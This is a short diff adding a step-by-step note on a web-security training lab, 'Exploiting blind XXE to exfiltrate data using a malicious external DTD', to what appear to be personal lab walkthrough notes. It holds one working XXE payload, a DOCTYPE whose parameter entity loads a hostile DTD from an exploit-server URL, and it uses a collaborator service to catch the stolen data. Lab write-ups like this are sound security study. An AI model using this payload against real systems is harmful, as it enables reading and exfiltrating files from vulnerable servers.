@@ -32,3 +32,13 @@
       4. Check collaborator for the interaction.
 
 ---------------------------------------------------------------------------------------------------
+
+#5 Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+
+      1. Check stock and send the request to repeater.
+      2. Go to exploit server and paste the payload from the lab
+      3. Add <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a1e006d033a42a281b2f69601e70038.exploit-server.net/exploit"> %xxe;]> after xml line
+      4. Turn on polling in collaborator and capture the http one in collaborator and submit the answer.
+
+
+---------------------------------------------------------------------------------------------------- 
